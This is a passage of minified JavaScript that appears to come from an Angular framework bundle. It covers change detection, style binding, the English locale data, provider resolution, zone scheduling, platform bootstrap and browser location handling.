p?.registerApplication(h),l.onDestroy(()=>{this.detachView(l.hostView),td(this.components,l),p?.unregisterApplication(h)}),this._loadComponent(l),l}tick(){this.zonelessEnabled||(this.dirtyFlags|=1),this._tick()}_tick=()=>{if(this.tracingSnapshot!==null){let r=this.tracingSnapshot;this.tracingSnapshot=null,r.run(Jm.CHANGE_DETECTION,this._tick);return}if(this._runningTick)throw new Y(101,!1);let t=De(null);try{this._runningTick=!0,this.synchronize()}catch(r){this.internalErrorHandler(r)}finally{this._runningTick=!1,De(t),this.afterTick.next()}};synchronize(){let t=null;this._injector.destroyed||(t=this._injector.get(us,null,{optional:!0})),this.dirtyFlags|=this.deferredDirtyFlags,this.deferredDirtyFlags=0;let r=0;for(;this.dirtyFlags!==0&&r++<_F;)this.synchronizeOnce(t)}synchronizeOnce(t){if(this.dirtyFlags|=this.deferredDirtyFlags,this.deferredDirtyFlags=0,this.dirtyFlags&16&&(this.dirtyFlags&=-17,this.rootEffectScheduler.flush()),this.dirtyFlags&7){let r=!!(this.dirtyFlags&1);this.dirtyFlags&=-8,this.dirtyFlags|=8;for(let{_lView:i,notifyErrorHandler:o}of this.allViews)EF(i,o,r,this.zonelessEnabled);if(this.dirtyFlags&=-5,this.syncDirtyFlagsWithViews(),this.dirtyFlags&23)return}else t?.begin?.(),t?.end?.();this.dirtyFlags&8&&(this.dirtyFlags&=-9,this.afterRenderManager.execute()),this.syncDirtyFlagsWithViews()}syncDirtyFlagsWithViews(){if(this.allViews.some(({_lView:t})=>Vd(t))){this.dirtyFlags|=2;return}else this.dirtyFlags&=-8}attachView(t){let r=t;this._views.push(r),r.attachToAppRef(this)}detachView(t){let r=t;td(this._views,r),r.detachFromAppRef()}_loadComponent(t){this.attachView(t.hostView),this.tick(),this.components.push(t),this._injector.get(Kd,[]).forEach(i=>i(t))}ngOnDestroy(){if(!this._destroyed)try{this._destroyListeners.forEach(t=>t()),this._views.slice().forEach(t=>t.destroy())}finally{this._destroyed=!0,this._views=[],this._destroyListeners=[]}}onDestroy(t){return this._destroyListeners.push(t),()=>td(this._destroyListeners,t)}destroy(){if(this._destroyed)throw new Y(406,!1);let t=this._injector;t.destroy&&!t.destroyed&&t.destroy()}get viewCount(){return this._views.length}warnIfDestroyed(){}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function td(n,e){let t=n.indexOf(e);t>-1&&n.splice(t,1)}function EF(n,e,t,r){if(!t&&!Vd(n))return;Ab(n,e,t&&!r?0:1)}function Qd(n,e,t,r){let i=Ge(),o=jm();if(yc(i,o,e)){let s=dn(),a=IC();aO(a,i,n,e,t,r)}return Qd}function IF(n,e,t,r){return yc(n,jm(),t)?e+Pm(t)+r:Zi}function Ql(n,e){return n<<17|e<<2}function Ki(n){return n>>17&32767}function DF(n){return(n&2)==2}function CF(n,e){return n&131071|e<<17}function Am(n){return n|2}function ds(n){return(n&131068)>>2}function Hg(n,e){return n&-131069|e<<2}function bF(n){return(n&1)===1}function Mm(n){return n|1}function TF(n,e,t,r,i,o){let s=o?e.classBindings:e.styleBindings,a=Ki(s),c=ds(s);n[r]=t;let l=!1,h;if(Array.isArray(t)){let p=t;h=p[1],(h===null||pc(p,h)>0)&&(l=!0)}else h=t;if(i)if(c!==0){let m=Ki(n[a+1]);n[r+1]=Ql(m,a),m!==0&&(n[m+1]=Hg(n[m+1],r)),n[a+1]=CF(n[a+1],r)}else n[r+1]=Ql(a,0),a!==0&&(n[a+1]=Hg(n[a+1],r)),a=r;else n[r+1]=Ql(c,0),a===0?a=r:n[c+1]=Hg(n[c+1],r),c=r;l&&(n[r+1]=Am(n[r+1])),I0(n,h,r,!0),I0(n,h,r,!1),SF(e,h,n,r,o),s=Ql(a,c),o?e.classBindings=s:e.styleBindings=s}function SF(n,e,t,r,i){let o=i?n.residualClasses:n.residualStyles;o!=null&&typeof e=="string"&&pc(o,e)>=0&&(t[r+1]=Mm(t[r+1]))}function I0(n,e,t,r){let i=n[t+1],o=e===null,s=r?Ki(i):ds(i),a=!1;for(;s!==0&&(a===!1||o);){let c=n[s],l=n[s+1];AF(c,e)&&(a=!0,n[s+1]=r?Mm(l):Am(l)),s=r?Ki(l):ds(l)}a&&(n[t+1]=r?Am(i):Mm(i))}function AF(n,e){return n===null||e==null||(Array.isArray(n)?n[1]:n)===e?!0:Array.isArray(n)&&typeof e=="string"?pc(n,e)>=0:!1}function D0(n,e,t,r,i){let o=e.inputs,s=i?"class":"style";uy(n,t,o[s],s,r)}function Yd(n,e){return MF(n,e,null,!0),Yd}function MF(n,e,t,r){let i=Ge(),o=dn(),s=h1(2);if(o.firstUpdatePass&&RF(o,n,s,r),e!==Zi&&yc(i,s,e)){let a=o.data[fs()];FF(o,a,i,i[mt],n,i[s+1]=VF(e,t),r,s)}}function xF(n,e){return e>=n.expandoStartIndex}function RF(n,e,t,r){let i=n.data;if(i[t+1]===null){let o=i[fs()],s=xF(n,t);LF(o,r)&&e===null&&!s&&(e=!1),e=NF(i,o,e,r),TF(i,o,e,t,s,r)}}function NF(n,e,t,r){let i=m1(n),o=r?e.residualClasses:e.residualStyles;if(i===null)(r?e.classBindings:e.styleBindings)===0&&(t=qg(null,n,e,t,r),t=dc(t,e.attrs,r),o=null);else{let s=e.directiveStylingLast;if(s===-1||n[s]!==i)if(t=qg(i,n,e,t,r),o===null){let c=PF(n,e,r);c!==void 0&&Array.isArray(c)&&(c=qg(null,n,e,c[1],r),c=dc(c,e.attrs,r),kF(n,e,r,c))}else o=OF(n,e,r)}return o!==void 0&&(r?e.residualClasses=o:e.residualStyles=o),t}function PF(n,e,t){let r=t?e.classBindings:e.styleBindings;if(ds(r)!==0)return n[Ki(r)]}function kF(n,e,t,r){let i=t?e.classBindings:e.styleBindings;n[Ki(i)]=r}function OF(n,e,t){let r,i=e.directiveEnd;for(let o=1+e.directiveStylingLast;o<i;o++){let s=n[o].hostAttrs;r=dc(r,s,t)}return dc(r,e.attrs,t)}function qg(n,e,t,r,i){let o=null,s=t.directiveEnd,a=t.directiveStylingLast;for(a===-1?a=t.directiveStart:a++;a<s&&(o=e[a],r=dc(r,o.hostAttrs,i),o!==n);)a++;return n!==null&&(t.directiveStylingLast=a),r}function dc(n,e,t){let r=t?1:2,i=-1;if(e!==null)for(let o=0;o<e.length;o++){let s=e[o];typeof s=="number"?i=s:i===r&&(Array.isArray(n)||(n=n===void 0?[]:["",n]),NP(n,s,t?!0:e[++o]))}return n===void 0?null:n}function FF(n,e,t,r,i,o,s,a){if(!(e.type&3))return;let c=n.data,l=c[a+1],h=bF(l)?C0(c,e,t,i,ds(l),s):void 0;if(!Td(h)){Td(o)||DF(l)&&(o=C0(c,null,t,i,a,s));let p=cC(fs(),t);Ck(r,s,p,i,o)}}function C0(n,e,t,r,i,o){let s=e===null,a;for(;i>0;){let c=n[i],l=Array.isArray(c),h=l?c[1]:c,p=h===null,m=t[i+1];m===Zi&&(m=p?cn:void 0);let y=p?Og(m,r):h===r?m:void 0;if(l&&!Td(y)&&(y=Og(c,r)),Td(y)&&(a=y,s))return a;let D=n[i+1];i=s?Ki(D):ds(D)}if(e!==null){let c=o?e.residualClasses:e.residualStyles;c!=null&&(a=Og(c,r))}return a}function Td(n){return n!==void 0}function VF(n,e){return n==null||n===""||(typeof e=="string"?n=n+e:typeof n=="object"&&(n=Ht(ty(n)))),n}function LF(n,e){return(n.flags&(e?8:16))!==0}function UF(n,e,t,r,i,o){let s=e.consts,a=JD(s,i),c=ay(e,n,2,r,a);return Yk(e,t,c,JD(s,o)),c.attrs!==null&&Cm(c,c.attrs,!1),c.mergedAttrs!==null&&Cm(c,c.mergedAttrs,!0),e.queries!==null&&e.queries.elementStart(e,c),c}function he(n,e,t,r){let i=Ge(),o=dn(),s=cr+n,a=i[mt],c=o.firstCreatePass?UF(s,o,i,e,t,r):o.data[s],l=jF(o,i,c,a,e,n);i[s]=l;let h=rC(c);return Ud(c,!0),ub(a,l,c),!pF(c)&&CC()&&sb(o,i,l,c),n1()===0&&ss(l,i),r1(),h&&(Uk(o,i,c),mb(o,c,i)),r!==null&&jk(i,c),he}function de(){let n=Xt();pC()?u1():(n=n.parent,Ud(n,!1));let e=n;s1(e)&&a1(),i1();let t=dn();return t.firstCreatePass&&(TC(t,n),nC(n)&&t.queries.elementEnd(n)),e.classesWithoutHost!=null&&I1(e)&&D0(t,e,Ge(),e.classesWithoutHost,!0),e.stylesWithoutHost!=null&&D1(e)&&D0(t,e,Ge(),e.stylesWithoutHost,!1),de}function Dt(n,e,t,r){return he(n,e,t,r),de(),Dt}var jF=(n,e,t,r,i,o)=>(bC(!0),eb(r,i,v1()));var Bi=void 0;function BF(n){let e=n,t=Math.floor(Math.abs(n)),r=n.toString().replace(/^[^.]*\.?/,"").length;return t===1&&r===0?1:5}var $F=["en",[["a","p"],["AM","PM"],Bi],[["AM","PM"],Bi,Bi],[["S","M","T","W","T","F","S"],["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],["Su","Mo","Tu","We","Th","Fr","Sa"]],Bi,[["J","F","M","A","M","J","J","A","S","O","N","D"],["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],["January","February","March","April","May","June","July","August","September","October","November","December"]],Bi,[["B","A"],["BC","AD"],["Before Christ","Anno Domini"]],0,[6,0],["M/d/yy","MMM d, y","MMMM d, y","EEEE, MMMM d, y"],["h:mm a","h:mm:ss a","h:mm:ss a z","h:mm:ss a zzzz"],["{1}, {0}",Bi,"{1} 'at' {0}",Bi],[".",",",";","%","+","-","E","\xD7","\u2030","\u221E","NaN",":"],["#,##0.###","#,##0%","\xA4#,##0.00","#E0"],"USD","$","US Dollar",{},"ltr",BF],zg={};function hn(n){let e=HF(n),t=b0(e);if(t)return t;let r=e.split("-")[0];if(t=b0(r),t)return t;if(r==="en")return $F;throw new Y(701,!1)}function b0(n){return n in zg||(zg[n]=Yt.ng&&Yt.ng.common&&Yt.ng.common.locales&&Yt.ng.common.locales[n]),zg[n]}var Ye=function(n){return n[n.LocaleId=0]="LocaleId",n[n.DayPeriodsFormat=1]="DayPeriodsFormat",n[n.DayPeriodsStandalone=2]="DayPeriodsStandalone",n[n.DaysFormat=3]="DaysFormat",n[n.DaysStandalone=4]="DaysStandalone",n[n.MonthsFormat=5]="MonthsFormat",n[n.MonthsStandalone=6]="MonthsStandalone",n[n.Eras=7]="Eras",n[n.FirstDayOfWeek=8]="FirstDayOfWeek",n[n.WeekendRange=9]="WeekendRange",n[n.DateFormat=10]="DateFormat",n[n.TimeFormat=11]="TimeFormat",n[n.DateTimeFormat=12]="DateTimeFormat",n[n.NumberSymbols=13]="NumberSymbols",n[n.NumberFormats=14]="NumberFormats",n[n.CurrencyCode=15]="CurrencyCode",n[n.CurrencySymbol=16]="CurrencySymbol",n[n.CurrencyName=17]="CurrencyName",n[n.Currencies=18]="Currencies",n[n.Directionality=19]="Directionality",n[n.PluralCase=20]="PluralCase",n[n.ExtraData=21]="ExtraData",n}(Ye||{});function HF(n){return n.toLowerCase().replace(/_/g,"-")}var Sd="en-US";var qF=Sd;function zF(n){typeof n=="string"&&(qF=n.toLowerCase().replace(/_/g,"-"))}var GF=(n,e,t)=>{};function Cn(n,e,t,r){let i=Ge(),o=dn(),s=Xt();return jb(o,i,i[mt],s,n,e,r),Cn}function WF(n,e,t,r){let i=n.cleanup;if(i!=null)for(let o=0;o<i.length-1;o+=2){let s=i[o];if(s===t&&i[o+1]===r){let a=e[ad],c=i[o+2];return a.length>c?a[c]:null}typeof s=="string"&&(o+=2)}return null}function jb(n,e,t,r,i,o,s){let a=rC(r),l=n.firstCreatePass&&fO(n),h=e[ar],p=hO(e),m=!0;if(r.type&3||s){let b=ln(r,e),T=s?s(b):b,F=p.length,$=s?G=>s(Un(G[r.index])):r.index,P=null;if(!s&&a&&(P=WF(n,e,i,r.index)),P!==null){let G=P.__ngLastListenerFn__||P;G.__ngNextListenerFn__=o,P.__ngLastListenerFn__=o,m=!1}else{o=S0(r,e,h,o),GF(b,i,o);let G=t.listen(T,i,o);p.push(o,G),l&&l.push(i,$,F,F+1)}}else o=S0(r,e,h,o);let y=r.outputs,D;if(m&&y!==null&&(D=y[i])){let b=D.length;if(b)for(let T=0;T<b;T+=2){let F=D[T],$=D[T+1],Z=e[F][$].subscribe(o),K=p.length;p.push(o,Z),l&&l.push(i,r.index,K,-(K+1))}}}function T0(n,e,t,r){let i=De(null);try{return Fn(6,e,t),t(r)!==!1}catch(o){return Db(n,o),!1}finally{Fn(7,e,t),De(i)}}function S0(n,e,t,r){return function i(o){if(o===Function)return r;let s=n.componentOffset>-1?Jr(n.index,e):e;ly(s,5);let a=T0(e,t,r,o),c=i.__ngNextListenerFn__;for(;c;)a=T0(e,t,c,o)&&a,c=c.__ngNextListenerFn__;return a}}function KF(n,e,t,r){t>=n.data.length&&(n.data[t]=null,n.blueprint[t]=null),e[t]=r}function Ue(n,e=""){let t=Ge(),r=dn(),i=n+cr,o=r.firstCreatePass?ay(r,i,1,e,null):r.data[i],s=QF(r,t,o,e,n);t[i]=s,CC()&&sb(r,t,s,o),Ud(o,!1)}var QF=(n,e,t,r,i)=>(bC(!0),ak(e[mt],r));function fy(n){return Bb("",n,""),fy}function Bb(n,e,t){let r=Ge(),i=IF(r,n,e,t);return i!==Zi&&pO(r,fs(),i),Bb}function ei(n,e,t){Pb(e)&&(e=e());let r=Ge(),i=jm();if(yc(r,i,e)){let o=dn(),s=IC();Kk(o,s,r,n,e,r[mt],t,!1)}return ei}function Xi(n,e){let t=Pb(n);return t&&n.set(e),t}function ti(n,e){let t=Ge(),r=dn(),i=Xt();return jb(r,t,t[mt],i,n,e),ti}function YF(n,e,t){let r=dn();if(r.firstCreatePass){let i=Qr(n);xm(t,r.data,r.blueprint,i,!0),xm(e,r.data,r.blueprint,i,!1)}}function xm(n,e,t,r,i){if(n=Nt(n),Array.isArray(n))for(let o=0;o<n.length;o++)xm(n[o],e,t,r,i);else{let o=dn(),s=Ge(),a=Xt(),c=ns(n)?n:Nt(n.provide),l=J0(n),h=a.providerIndexes&1048575,p=a.directiveStart,m=a.providerIndexes>>20;if(ns(n)||!n.multi){let y=new Wi(l,i,Ie),D=Wg(c,e,i?h:h+m,p);D===-1?(cm(gd(a,s),o,c),Gg(o,n,e.length),e.push(c),a.directiveStart++,a.directiveEnd++,i&&(a.providerIndexes+=1048576),t.push(y),s.push(y)):(t[D]=y,s[D]=y)}else{let y=Wg(c,e,h+m,p),D=Wg(c,e,h,h+m),b=y>=0&&t[y],T=D>=0&&t[D];if(i&&!T||!i&&!b){cm(gd(a,s),o,c);let F=XF(i?JF:ZF,t.length,i,r,l);!i&&T&&(t[D].providerFactory=F),Gg(o,n,e.length,0),e.push(c),a.directiveStart++,a.directiveEnd++,i&&(a.providerIndexes+=1048576),t.push(F),s.push(F)}else{let F=$b(t[i?D:y],l,!i&&r);Gg(o,n,y>-1?y:D,F)}!i&&r&&T&&t[D].componentProviders++}}}function Gg(n,e,t,r){let i=ns(e),o=LP(e);if(i||o){let c=(o?Nt(e.useClass):e).prototype.ngOnDestroy;if(c){let l=n.destroyHooks||(n.destroyHooks=[]);if(!i&&e.multi){let h=l.indexOf(t);h===-1?l.push(t,[r,c]):l[h+1].push(r,c)}else l.push(t,c)}}}function $b(n,e,t){return t&&n.componentProviders++,n.multi.push(e)-1}function Wg(n,e,t,r){for(let i=t;i<r;i++)if(e[i]===n)return i;return-1}function ZF(n,e,t,r){return Rm(this.multi,[])}function JF(n,e,t,r){let i=this.multi,o;if(this.providerFactory){let s=this.providerFactory.componentProviders,a=is(t,t[fe],this.providerFactory.index,r);o=a.slice(0,s),Rm(i,o);for(let c=s;c<a.length;c++)o.push(a[c])}else o=[],Rm(i,o);return o}function Rm(n,e){for(let t=0;t<n.length;t++){let r=n[t];e.push(r())}return e}function XF(n,e,t,r,i){let o=new Wi(n,t,Ie);return o.multi=[],o.index=e,o.componentProviders=0,$b(o,i,r&&!t),o}function _c(n,e=[]){return t=>{t.providersResolver=(r,i)=>YF(r,i?i(n):n,e)}}function eV(n,e){let t=n[e];return t===Zi?void 0:t}function tV(n,e,t,r,i,o){let s=e+t;return yc(n,s,i)?fF(n,s+1,o?r.call(o,i):r(i)):eV(n,s+1)}function Hb(n,e){let t=dn(),r,i=n+cr;t.firstCreatePass?(r=nV(e,t.pipeRegistry),t.data[i]=r,r.onDestroy&&(t.destroyHooks??=[]).push(i,r.onDestroy)):r=t.data[i];let o=r.factory||(r.factory=Hi(r.type,!0)),s,a=$t(Ie);try{let c=pd(!1),l=o();return pd(c),KF(t,Ge(),i,l),l}finally{$t(a)}}function nV(n,e){if(e)for(let t=e.length-1;t>=0;t--){let r=e[t];if(n===r.name)return r}}function qb(n,e,t){let r=n+cr,i=Ge(),o=XP(i,r);return rV(i,r)?tV(i,l1(),e,o.transform,t,o):o.transform(t)}function rV(n,e){return n[fe].data[e].pure}var Yl=null;function iV(n){Yl!==null&&(n.defaultEncapsulation!==Yl.defaultEncapsulation||n.preserveWhitespaces!==Yl.preserveWhitespaces)||(Yl=n)}var dr=class{full;major;minor;patch;constructor(e){this.full=e;let t=e.split(".");this.major=t[0],this.minor=t[1],this.patch=t.slice(2).join(".")}},zb=new dr("19.0.1"),Nm=class{ngModuleFactory;componentFactories;constructor(e,t){this.ngModuleFactory=e,this.componentFactories=t}},Zd=(()=>{class n{compileModuleSync(t){return new bd(t)}compileModuleAsync(t){return Promise.resolve(this.compileModuleSync(t))}compileModuleAndAllComponentsSync(t){let r=this.compileModuleSync(t),i=z0(t),o=XC(i.declarations).reduce((s,a)=>{let c=Wr(a);return c&&s.push(new ls(c)),s},[]);return new Nm(r,o)}compileModuleAndAllComponentsAsync(t){return Promise.resolve(this.compileModuleAndAllComponentsSync(t))}clearCache(){}clearCacheFor(t){}getModuleId(t){}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),oV=new j("");function sV(n,e,t){let r=new bd(t);return Promise.resolve(r)}function A0(n){for(let e=n.length-1;e>=0;e--)if(n[e]!==void 0)return n[e]}var aV=(()=>{class n{zone=V(pe);changeDetectionScheduler=V(os);applicationRef=V(mr);_onMicrotaskEmptySubscription;initialize(){this._onMicrotaskEmptySubscription||(this._onMicrotaskEmptySubscription=this.zone.onMicrotaskEmpty.subscribe({next:()=>{this.changeDetectionScheduler.runningTick||this.zone.run(()=>{this.applicationRef.tick()})}}))}ngOnDestroy(){this._onMicrotaskEmptySubscription?.unsubscribe()}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function cV({ngZoneFactory:n,ignoreChangesOutsideZone:e,scheduleInRootZone:t}){return n??=()=>new pe(ue(U({},Gb()),{scheduleInRootZone:t})),[{provide:pe,useFactory:n},{provide:ts,multi:!0,useFactory:()=>{let r=V(aV,{optional:!0});return()=>r.initialize()}},{provide:ts,multi:!0,useFactory:()=>{let r=V(uV);return()=>{r.initialize()}}},e===!0?{provide:UC,useValue:!0}:[],{provide:jC,useValue:t??LC}]}function Gb(n){return{enableLongStackTrace:!1,shouldCoalesceEventChangeDetection:n?.eventCoalescing??!1,shouldCoalesceRunChangeDetection:n?.runCoalescing??!1}}var uV=(()=>{class n{subscription=new ze;initialized=!1;zone=V(pe);pendingTasks=V(pr);initialize(){if(this.initialized)return;this.initialized=!0;let t=null;!this.zone.isStable&&!this.zone.hasPendingMacrotasks&&!this.zone.hasPendingMicrotasks&&(t=this.pendingTasks.add()),this.zone.runOutsideAngular(()=>{this.subscription.add(this.zone.onStable.subscribe(()=>{pe.assertNotInAngularZone(),queueMicrotask(()=>{t!==null&&!this.zone.hasPendingMacrotasks&&!this.zone.hasPendingMicrotasks&&(this.pendingTasks.remove(t),t=null)})}))}),this.subscription.add(this.zone.onUnstable.subscribe(()=>{pe.assertInAngularZone(),t??=this.pendingTasks.add()}))}ngOnDestroy(){this.subscription.unsubscribe()}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();var lV=(()=>{class n{appRef=V(mr);taskService=V(pr);ngZone=V(pe);zonelessEnabled=V(zm);tracing=V(jd,{optional:!0});disableScheduling=V(UC,{optional:!0})??!1;zoneIsDefined=typeof Zone<"u"&&!!Zone.root.run;schedulerTickApplyArgs=[{data:{__scheduler_tick__:!0}}];subscriptions=new ze;angularZoneId=this.zoneIsDefined?this.ngZone._inner?.get(yd):null;scheduleInRootZone=!this.zonelessEnabled&&this.zoneIsDefined&&(V(jC,{optional:!0})??!1);cancelScheduledCallback=null;useMicrotaskScheduler=!1;runningTick=!1;pendingRenderTaskId=null;constructor(){this.subscriptions.add(this.appRef.afterTick.subscribe(()=>{this.runningTick||this.cleanup()})),this.subscriptions.add(this.ngZone.onUnstable.subscribe(()=>{this.runningTick||this.cleanup()})),this.disableScheduling||=!this.zonelessEnabled&&(this.ngZone instanceof vd||!this.zoneIsDefined)}notify(t){if(!this.zonelessEnabled&&t===5)return;let r=!1;switch(t){case 0:{this.appRef.dirtyFlags|=2;break}case 3:case 2:case 4:case 5:case 1:{this.appRef.dirtyFlags|=4;break}case 8:{this.appRef.deferredDirtyFlags|=8;break}case 6:{this.appRef.dirtyFlags|=2,r=!0;break}case 13:{this.appRef.dirtyFlags|=16,r=!0;break}case 14:{this.appRef.dirtyFlags|=2,r=!0;break}case 12:{r=!0;break}case 10:case 9:case 7:case 11:default:this.appRef.dirtyFlags|=8}if(this.appRef.tracingSnapshot=this.tracing?.snapshot(this.appRef.tracingSnapshot)??null,!this.shouldScheduleTick(r))return;let i=this.useMicrotaskScheduler?o0:BC;this.pendingRenderTaskId=this.taskService.add(),this.scheduleInRootZone?this.cancelScheduledCallback=Zone.root.run(()=>i(()=>this.tick())):this.cancelScheduledCallback=this.ngZone.runOutsideAngular(()=>i(()=>this.tick()))}shouldScheduleTick(t){return!(this.disableScheduling&&!t||this.appRef.destroyed||this.pendingRenderTaskId!==null||this.runningTick||this.appRef._runningTick||!this.zonelessEnabled&&this.zoneIsDefined&&Zone.current.get(yd+this.angularZoneId))}tick(){if(this.runningTick||this.appRef.destroyed)return;if(this.appRef.dirtyFlags===0){this.cleanup();return}!this.zonelessEnabled&&this.appRef.dirtyFlags&7&&(this.appRef.dirtyFlags|=1);let t=this.taskService.add();try{this.ngZone.run(()=>{this.runningTick=!0,this.appRef._tick()},void 0,this.schedulerTickApplyArgs)}catch(r){throw this.taskService.remove(t),r}finally{this.cleanup()}this.useMicrotaskScheduler=!0,o0(()=>{this.useMicrotaskScheduler=!1,this.taskService.remove(t)})}ngOnDestroy(){this.subscriptions.unsubscribe(),this.cleanup()}cleanup(){if(this.runningTick=!1,this.cancelScheduledCallback?.(),this.cancelScheduledCallback=null,this.pendingRenderTaskId!==null){let t=this.pendingRenderTaskId;this.pendingRenderTaskId=null,this.taskService.remove(t)}}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();function dV(){return typeof $localize<"u"&&$localize.locale||Sd}var Jd=new j("",{providedIn:"root",factory:()=>V(Jd,le.Optional|le.SkipSelf)||dV()});var Ad=new j("");function Zl(n){return!n.moduleRef}function hV(n){let e=Zl(n)?n.r3Injector:n.moduleRef.injector,t=e.get(pe);return t.run(()=>{Zl(n)?n.r3Injector.resolveInjectorInitializers():n.moduleRef.resolveInjectorInitializers();let r=e.get(ur,null),i;if(t.runOutsideAngular(()=>{i=t.onError.subscribe({next:o=>{r.handleError(o)}})}),Zl(n)){let o=()=>e.destroy(),s=n.platformInjector.get(Ad);s.add(o),e.onDestroy(()=>{i.unsubscribe(),s.delete(o)})}else{let o=()=>n.moduleRef.destroy(),s=n.platformInjector.get(Ad);s.add(o),n.moduleRef.onDestroy(()=>{td(n.allPlatformModules,n.moduleRef),i.unsubscribe(),s.delete(o)})}return wF(r,t,()=>{let o=e.get(Lb);return o.runInitializers(),o.donePromise.then(()=>{let s=e.get(Jd,Sd);if(zF(s||Sd),Zl(n)){let a=e.get(mr);return n.rootComponent!==void 0&&a.bootstrap(n.rootComponent),a}else return fV(n.moduleRef,n.allPlatformModules),n.moduleRef})})})}function fV(n,e){let t=n.injector.get(mr);if(n._bootstrapComponents.length>0)n._bootstrapComponents.forEach(r=>t.bootstrap(r));else if(n.instance.ngDoBootstrap)n.instance.ngDoBootstrap(t);else throw new Y(-403,!1);e.push(n)}var Wb=(()=>{class n{_injector;_modules=[];_destroyListeners=[];_destroyed=!1;constructor(t){this._injector=t}bootstrapModuleFactory(t,r){let i=r?.scheduleInRootZone,o=()=>H1(r?.ngZone,ue(U({},Gb({eventCoalescing:r?.ngZoneEventCoalescing,runCoalescing:r?.ngZoneRunCoalescing})),{scheduleInRootZone:i})),s=r?.ignoreChangesOutsideZone,a=[cV({ngZoneFactory:o,ignoreChangesOutsideZone:s}),{provide:os,useExisting:lV}],c=nF(t.moduleType,this.injector,a);return hV({moduleRef:c,allPlatformModules:this._modules,platformInjector:this.injector})}bootstrapModule(t,r=[]){let i=Ub({},r);return sV(this.injector,i,t).then(o=>this.bootstrapModuleFactory(o,i))}onDestroy(t){this._destroyListeners.push(t)}get injector(){return this._injector}destroy(){if(this._destroyed)throw new Y(404,!1);this._modules.slice().forEach(r=>r.destroy()),this._destroyListeners.forEach(r=>r());let t=this._injector.get(Ad,null);t&&(t.forEach(r=>r()),t.clear()),this._destroyed=!0}get destroyed(){return this._destroyed}static \u0275fac=function(r){return new(r||n)(L(Jt))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"platform"})}return n})(),ic=null,Kb=new j("");function pV(n){if(ic&&!ic.get(Kb,!1))throw new Y(400,!1);yF(),ic=n;let e=n.get(Wb);return yV(n),e}function py(n,e,t=[]){let r=`Platform: ${e}`,i=new j(r);return(o=[])=>{let s=Qb();if(!s||s.injector.get(Kb,!1)){let a=[...t,...o,{provide:i,useValue:!0}];n?n(a):pV(gV(a,r))}return mV(i)}}function gV(n=[],e){return Jt.create({name:e,providers:[{provide:Pd,useValue:"platform"},{provide:Ad,useValue:new Set([()=>ic=null])},...n]})}function mV(n){let e=Qb();if(!e)throw new Y(401,!1);return e}function Qb(){return ic?.get(Wb)??null}function yV(n){let e=n.get(Ym,null);qt(n,()=>{e?.forEach(t=>t())})}function gy(){return!1}var eo=(()=>{class n{static __NG_ELEMENT_ID__=vV}return n})();function vV(n){return _V(Xt(),Ge(),(n&16)===16)}function _V(n,e,t){if(Fd(n)&&!t){let r=Jr(n.index,e);return new as(r,r)}else if(n.type&175){let r=e[Ln];return new as(r,e)}return null}var Yb=py(null,"core",[]),Zb=(()=>{class n{constructor(t){}static \u0275fac=function(r){return new(r||n)(L(mr))};static \u0275mod=Qe({type:n});static \u0275inj=Ke({})}return n})();function Xd(n){return typeof n=="boolean"?n:n!=null&&n!=="false"}function wc(n,e){gs("NgSignals");let t=yD(n);return e?.equal&&(t[Qt].equal=e.equal),t}function yr(n){let e=De(null);try{return n()}finally{De(e)}}var M0=class{[Qt];constructor(e){this[Qt]=e}destroy(){this[Qt].destroy()}};function Jb(n){let e=Wr(n);if(!e)return null;let t=new ls(e);return{get selector(){return t.selector},get type(){return t.componentType},get inputs(){return t.inputs},get outputs(){return t.outputs},get ngContentSelectors(){return t.ngContentSelectors},get isStandalone(){return e.standalone},get isSignal(){return e.signals}}}var nT=null;function $n(){return nT}function rT(n){nT??=n}var ch=class{};var bt=new j(""),Ey=(()=>{class n{historyGo(t){throw new Error("")}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(IV),providedIn:"platform"})}return n})(),iT=new j(""),IV=(()=>{class n extends Ey{_location;_history;_doc=V(bt);constructor(){super(),this._location=window.location,this._history=window.history}getBaseHrefFromDOM(){return $n().getBaseHref(this._doc)}onPopState(t){let r=$n().getGlobalEventTarget(this._doc,"window");return r.addEventListener("popstate",t,!1),()=>r.removeEventListener("popstate",t)}onHashChange(t){let r=$n().getGlobalEventTarget(this._doc,"window");return r.addEventListener("hashchange",t,!1),()=>r.removeEventListener("hashchange",t)}get href(){return this._location.href}get protocol(){return this._location.protocol}get hostname(){return this._location.hostname}get port(){return this._location.port}get pathname(){return this._location.pathname}get search(){return this._location.search}get hash(){return this._location.hash}set pathname(t){this._location.pathname=t}pushState(t,r,i){this._history.pushState(t,r,i)}replaceState(t,r,i){this._history.replaceState(t,r,i)}forward(){this._history.forward()}back(){this._history.back()}historyGo(t=0){this._history.go(t)}getState(){return this._history.state}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>new n,providedIn:"platform"})}return n})();function Iy(n,e){if(n.length==0)return e;if(e.length==0)return n;let t=0;return n.endsWith("/")&&t++,e.startsWith("/")&&t++,t==2?n+e.substring(1):t==1?n+e:n+"/"+e}function Xb(n){let e=n.match(/#|\?|$/),t=e&&e.index||n.length,r=t-(n[t-1]==="/"?1:0);return n.slice(0,r)+n.slice(t)}function _r(n){return n&&n[0]!=="?"?"?"+n:n}var to=(()=>{class n{historyGo(t){throw new Error("")}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>V(Dy),providedIn:"root"})}return n})(),oT=new j(""),Dy=(()=>{class n extends 